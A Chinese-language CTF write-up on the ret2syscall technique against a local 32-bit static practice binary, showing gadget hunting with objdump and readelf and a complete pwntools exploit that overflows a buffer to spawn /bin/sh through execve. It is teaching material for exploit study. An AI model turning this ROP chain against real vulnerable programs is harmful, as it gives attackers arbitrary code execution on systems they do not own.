## ret2syscall

2019-06-08

binary: [rop](#binary/rop)

32位程序，静态编译，溢出点在main函数

下面主要讲述ROP链的手工编写

### ROP链

一般来讲只有静态编译的程序才有机会用这种方式来进行ROP

动态链接的话如果给了libc，可以通过leak出某个函数的地址，根据偏移计算出system地址



可以使用ROPgadget进行自动生成

`ROPgadget --binary rop --ropchain`



或者使用`objdump` + `grep`进行手动查找gadget

最终目的是执行execve("/bin/sh", 0, 0)，即

```
eax  -> 0xb
ebx  -> "/bin/sh"
ecx  -> 0
edx  -> 0
int 0x80
```



#### 0x1 首先查找有无`int 0x80`

```shell
$ objdump -d -M intel rop | grep 'int    0x80'
 8049421:	cd 80                	int    0x80
 806c765:	cd 80                	int    0x80
 806ec4e:	cd 80                	int    0x80
 806f230:	cd 80                	int    0x80
 807b725:	cd 80                	int    0x80
 807b72e:	cd 80                	int    0x80
 80924e9:	cd 80                	int    0x80
 8093e9b:	cd 80                	int    0x80

```

#### 0x2 查找pop eax|ret

```shell
$ objdump -d -M intel rop | grep -A 5 'pop    eax' | grep -B 5 ret
 805cb0c:	58                   	pop    eax
 805cb0d:	89 c7                	mov    edi,eax
 805cb0f:	89 d6                	mov    esi,edx
 805cb11:	8b 44 24 04          	mov    eax,DWORD PTR [esp+0x4]
 805cb15:	c3                   	ret    
 805cb16:	d1 e9                	shr    ecx,1
--
 806d076:	58                   	pop    eax
 806d077:	3d 01 f0 ff ff       	cmp    eax,0xfffff001
 806d07c:	0f 83 ce 31 00 00    	jae    8070250 <__syscall_error>
 806d082:	c3                   	ret    
--
 806d085:	66 90                	xchg   ax,ax
--
 806d0e6:	58                   	pop    eax
 806d0e7:	3d 01 f0 ff ff       	cmp    eax,0xfffff001
 806d0ec:	0f 83 5e 31 00 00    	jae    8070250 <__syscall_error>
 806d0f2:	c3                   	ret    
--
 806d0f5:	66 90                	xchg   ax,ax
--
 806d156:	58                   	pop    eax
 806d157:	3d 01 f0 ff ff       	cmp    eax,0xfffff001
 806d15c:	0f 83 ee 30 00 00    	jae    8070250 <__syscall_error>
 806d162:	c3                   	ret    
--
 806d165:	66 90                	xchg   ax,ax
--
 806d29b:	58                   	pop    eax
 806d29c:	3d 01 f0 ff ff       	cmp    eax,0xfffff001
 806d2a1:	0f 83 a9 2f 00 00    	jae    8070250 <__syscall_error>
 806d2a7:	c3                   	ret    
--
--
 809ddda:	58                   	pop    eax
 809dddb:	5b                   	pop    ebx
 809dddc:	5e                   	pop    esi
 809dddd:	5f                   	pop    edi
 809ddde:	c3                   	ret    
--
--
 809de3a:	58                   	pop    eax
 809de3b:	5b                   	pop    ebx
 809de3c:	5e                   	pop    esi
 809de3d:	5f                   	pop    edi
 809de3e:	c3                   	ret    

```

看起来0x809ddda还算能用

#### 0x3 查找pop ebx|ret

上面0x809ddda的下一条指令刚好满足条件

```
 809dddb:	5b                   	pop    ebx
 809dddc:	5e                   	pop    esi
 809dddd:	5f                   	pop    edi
 809ddde:	c3                   	ret  
```

#### 0x4  查找pop ecx|ret

```shell
$ objdump -d -M intel rop | grep -A 5 'pop    ecx' | grep -B 5 ret
 806eb91:	59                   	pop    ecx
 806eb92:	5b                   	pop    ebx
 806eb93:	c3                   	ret    
```

由于此处会修改ebx，考虑直接用这个gadget同时修改ebx和ecx

#### 0x5 查找pop edx|ret

```shell
$ objdump -d -M intel rop | grep -A 5 'pop    edx' | grep -B 5 ret
 806eb6a:	5a                   	pop    edx
 806eb6b:	c3                   	ret    
--
 806eb70:	53                   	push   ebx
--
 806eb90:	5a                   	pop    edx
 806eb91:	59                   	pop    ecx
 806eb92:	5b                   	pop    ebx
 806eb93:	c3                   	ret    
--
--
 809c7f0:	5a                   	pop    edx
 809c7f1:	8b 0c 24             	mov    ecx,DWORD PTR [esp]
 809c7f4:	89 04 24             	mov    DWORD PTR [esp],eax
 809c7f7:	8b 44 24 04          	mov    eax,DWORD PTR [esp+0x4]
 809c7fb:	c2 0c 00             	ret    0xc
--
 809c836:	5a                   	pop    edx
 809c837:	5a                   	pop    edx
 809c838:	8b 0c 24             	mov    ecx,DWORD PTR [esp]
 809c83b:	89 04 24             	mov    DWORD PTR [esp],eax
 809c83e:	8b 44 24 04          	mov    eax,DWORD PTR [esp+0x4]
 809c842:	c2 14 00             	ret    0x14

```

#### 0x6 查找指向/bin/sh的指针

先用`strings`查看有没有这个字符串

```
$ strings rop | grep /bin/sh
/bin/sh
```

一般来讲const char*的数据存储在.rodata段

用`readelf`查看字符串

```shell
$ readelf -p .rodata rop | grep sh
  [     8]  /bin/sh
  [   1fb]  /usr/share/locale
  [   234]  /usr/share/locale-langpack
  [  3a58]  clflush
  [  3d2c]  deriv->steps[cnt].__shlib_handle != ((void *)0)
  [  49a3]  do_release_shlib
  [  49b4]  __gconv_find_shlib
  [ 13268]  /usr/share/zoneinfo
  [ 142ce]  cannot stat shared object
  [ 14393]  file too short
  [ 14528]  cannot create shared object descriptor
  [ 145a0]  shared object cannot be dlopen()ed
  [ 145c4]  cannot enable executable stack as shared object requires
  [ 146e8]  failed to map segment from shared object
  [ 1498c]  cannot open shared object file
  [ 14ae1]  _dl_setup_hash
  [ 14da0]  %s: Symbol `%s' has different size in shared object, consider re-linking^J
  [ 152c0]  error while loading shared libraries
  [ 15803]  ! should_be_there

```

在.rodata段+8的位置

获取.rodata的基地址

```shell
$ readelf -S rop | grep .rodata
  [10] .rodata           PROGBITS        080be400 076400 01bfd0 00   A  0   0 32
```

0x80be400



### 编写payload

```python
from struct import pack

def p32(address):
    return pack("<I", address)

eax = 0x809ddda
"""
 809ddda:   58                      pop    eax
 809dddb:   5b                      pop    ebx
 809dddc:   5e                      pop    esi
 809dddd:   5f                      pop    edi
 809ddde:   c3                      ret
"""

ecx = 0x806eb91
"""
 806eb91:   59                      pop    ecx
 806eb92:   5b                      pop    ebx
 806eb93:   c3                      ret    
"""

edx = 0x806eb6a
"""
 806eb6a:   5a                      pop    edx
 806eb6b:   c3                      ret   
"""

binsh = 0x80be400+8
int80 = 0x8049421

payload =  p32(eax) + p32(11) + 'AAAA' + 'AAAA' + 'AAAA'
payload += p32(ecx) + p32(0) + p32(binsh)
payload += p32(edx) + p32(0)
payload += p32(int80)

from pwn import *
local = process("./rop")
gdb.attach(local, 'b*0x809ddda\nc')

payload = 'A' * 0x6c + 'BBBB' + payload
local.sendline(payload)
local.interactive()

```

